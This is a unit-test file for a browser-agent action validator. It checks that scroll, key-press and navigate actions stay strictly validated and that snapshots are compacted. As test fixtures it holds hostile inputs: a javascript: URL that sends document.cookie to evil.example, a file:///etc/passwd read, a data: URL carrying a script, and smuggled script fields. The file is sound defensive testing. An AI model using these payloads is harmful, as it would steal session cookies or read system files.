// Unit tests for the expanded browser-action schema and snapshot compaction.
//
// The safety property under test: the action interface stays strictly
// validated as it grows. Adding scroll/key_press/navigate must not create a
// path for the model to execute arbitrary code.
//
// Run with: node --test tests/browser-actions.test.js

import test from "node:test";
import assert from "node:assert/strict";

import { validateAction, compactSnapshot, decideAction } from "../src/lib/ui-agent.js";

// ---------------------------------------------------------------------------
// The original vocabulary is unchanged (Part 6: retain all existing actions)
// ---------------------------------------------------------------------------

test("every original action is still accepted", () => {
  const original = ["click", "type", "select", "check", "uncheck", "upload", "wait", "ask_user", "finish", "stop"];
  for (const action of original) {
    assert.equal(validateAction({ action }).action, action, `"${action}" must still be accepted`);
  }
});

test("the new general browser actions are accepted", () => {
  assert.equal(validateAction({ action: "double_click", target: "element_1" }).action, "double_click");
  assert.equal(validateAction({ action: "scroll_to", target: "element_1" }).action, "scroll_to");
  assert.equal(validateAction({ action: "go_back" }).action, "go_back");
  assert.equal(validateAction({ action: "go_forward" }).action, "go_forward");
  assert.equal(validateAction({ action: "switch_tab" }).action, "switch_tab");
  assert.equal(validateAction({ action: "close_tab" }).action, "close_tab");
});

// ---------------------------------------------------------------------------
// key_press
// ---------------------------------------------------------------------------

test("key_press accepts named keys and normalises their case", () => {
  assert.equal(validateAction({ action: "key_press", key: "ENTER" }).key, "ENTER");
  assert.equal(validateAction({ action: "key_press", key: "enter" }).key, "ENTER");
  assert.equal(validateAction({ action: "key_press", value: "Tab" }).key, "TAB");
});

test("key_press rejects anything outside the key allow-list", () => {
  for (const key of ["F12", "META+R", "a", "', DROP TABLE", ""]) {
    const result = validateAction({ action: "key_press", key });
    assert.equal(result.action, "stop", `key "${key}" must be refused`);
  }
});

// ---------------------------------------------------------------------------
// scroll
// ---------------------------------------------------------------------------

test("scroll normalises direction and clamps distance", () => {
  const a = validateAction({ action: "scroll", direction: "down", amount: 600 });
  assert.equal(a.direction, "down");
  assert.equal(a.amount, 600);

  assert.equal(validateAction({ action: "scroll", direction: "sideways" }).direction, "down");
  assert.equal(validateAction({ action: "scroll", amount: 99999 }).amount, 5000);
  assert.equal(validateAction({ action: "scroll", amount: 1 }).amount, 50);
  assert.equal(validateAction({ action: "scroll", amount: -800 }).amount, 800);
});

// ---------------------------------------------------------------------------
// navigate — the highest-risk addition
// ---------------------------------------------------------------------------

test("navigate accepts an http(s) URL", () => {
  const a = validateAction({ action: "navigate", value: "https://boards.greenhouse.io/acme/jobs/1" });
  assert.equal(a.action, "navigate");
  assert.equal(a.value, "https://boards.greenhouse.io/acme/jobs/1");
});

test("navigate refuses javascript:, data: and other non-http schemes", () => {
  const dangerous = [
    "javascript:alert(1)",
    "javascript:fetch('https://evil.example/'+document.cookie)",
    "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd",
    "chrome://settings",
    "vbscript:msgbox(1)",
    "not a url",
    "",
  ];
  for (const value of dangerous) {
    const result = validateAction({ action: "navigate", value });
    assert.equal(result.action, "stop", `"${value}" must be refused`);
  }
});

test("open_tab is validated the same way as navigate", () => {
  assert.equal(validateAction({ action: "open_tab", value: "javascript:alert(1)" }).action, "stop");
  assert.equal(validateAction({ action: "open_tab", value: "https://example.com" }).action, "open_tab");
});

// ---------------------------------------------------------------------------
// The code-execution boundary holds
// ---------------------------------------------------------------------------

test("no action permits arbitrary code or selectors", () => {
  for (const action of ["eval", "execute_script", "run_js", "evaluate", "inject", "xpath", "query_selector"]) {
    assert.equal(validateAction({ action, value: "alert(1)" }).action, "stop", `"${action}" must be refused`);
  }
});

test("a code payload smuggled alongside a valid action is dropped", () => {
  const result = validateAction({
    action: "click",
    target: "element_5",
    script: "fetch('https://evil.example')",
    selector: "#apply",
    xpath: "//button",
    code: "while(true){}",
  });
  assert.equal(result.action, "click");
  assert.equal(result.target, "element_5");
  for (const key of ["script", "selector", "xpath", "code"]) {
    assert.ok(!(key in result), `"${key}" must not survive validation`);
  }
});

test("targets that are selectors rather than element IDs are still dropped", () => {
  for (const target of ["#apply-button", ".btn > span", "//button[1]", "document.body", "element_1; drop"]) {
    assert.ok(!("target" in validateAction({ action: "click", target })), `"${target}" must be dropped`);
  }
});

// ---------------------------------------------------------------------------
// Snapshot compaction (Part 23)
// ---------------------------------------------------------------------------

test("compactSnapshot keeps the fields the model reasons over", () => {
  const snapshot = {
    page: { url: "https://x.test/j/1", applicationState: "ready" },
    elements: [{
      id: "element_1", tag: "button", role: "button", type: "button",
      text: "Easy Apply", ariaLabel: "Easy Apply", title: "",
      visible: true, enabled: true, disabled: false,
      rect: { x: 500, y: 300, width: 120, height: 40 },
      connected: true,
    }],
    applyCandidates: [{ id: "element_1", name: "Easy Apply", score: 1 }],
    fingerprint: { bodyTextHash: "abc", capturedAt: 1 },
  };

  const compact = compactSnapshot(snapshot);
  const el = compact.elements[0];

  assert.equal(el.id, "element_1");
  assert.equal(el.text, "Easy Apply");
  assert.equal(el.ariaLabel, "Easy Apply");
  assert.deepEqual(el.rect, { x: 500, y: 300, width: 120, height: 40 });
  assert.deepEqual(compact.applyCandidates, snapshot.applyCandidates);

  // Bookkeeping the model does not need is not sent.
  assert.ok(!("fingerprint" in compact), "the page fingerprint is internal");
  assert.ok(!("connected" in el));
  assert.ok(!("title" in el), "empty fields are omitted");
});

test("compactSnapshot reads the legacy `controls` array when `elements` is absent", () => {
  const compact = compactSnapshot({
    page: {},
    controls: [{ id: "element_1", tag: "button", role: "button", text: "Next" }],
  });
  assert.equal(compact.elements.length, 1);
  assert.equal(compact.elements[0].text, "Next");
});

test("compactSnapshot truncates very long text rather than dropping the element", () => {
  const compact = compactSnapshot({
    page: {},
    elements: [{ id: "element_1", tag: "div", role: "button", text: "x".repeat(5000) }],
  });
  assert.ok(compact.elements[0].text.length <= 160);
});

// ---------------------------------------------------------------------------
// decideAction plumbing for visual context and failure feedback
// ---------------------------------------------------------------------------

test("a screenshot is forwarded to the provider as the multimodal file", async () => {
  let received = null;
  const askJSON = async (args) => { received = args; return { action: "click", target: "element_1" }; };
  const snapshot = { page: { applicationState: "ready" }, elements: [], loading: false };

  await decideAction(snapshot, {}, askJSON, { screenshot: { mime: "image/png", b64: "AAAA" } });

  assert.deepEqual(received.file, { mime: "image/png", b64: "AAAA" });
  assert.match(received.user, /screenshot of the current viewport is attached/i);
});

test("no screenshot is sent on an ordinary turn", async () => {
  let received = null;
  const askJSON = async (args) => { received = args; return { action: "click", target: "element_1" }; };
  await decideAction({ page: {}, elements: [], loading: false }, {}, askJSON);
  assert.equal(received.file, undefined);
});

test("a previous no-effect action is reported back to the model", async () => {
  let received = null;
  const askJSON = async (args) => { received = args; return { action: "scroll", direction: "down" }; };

  await decideAction({ page: {}, elements: [], loading: false }, {}, askJSON, {
    lastFailure: { action: "click", target: "element_12", verdict: "ACTION_NO_EFFECT" },
  });

  assert.match(received.user, /PreviousActionFailed/);
  assert.match(received.user, /element_12/);
  assert.match(received.user, /did not react/i);
});

test("the system prompt forbids claiming submission without confirmation", async () => {
  let received = null;
  const askJSON = async (args) => { received = args; return { action: "wait" }; };
  await decideAction({ page: {}, elements: [], loading: false }, {}, askJSON);

  assert.match(received.system, /finish ONLY when the page shows an explicit confirmation/i);
  assert.match(received.system, /Never attempt to solve or work around/i);
  assert.match(received.system, /ariaLabel/);
});
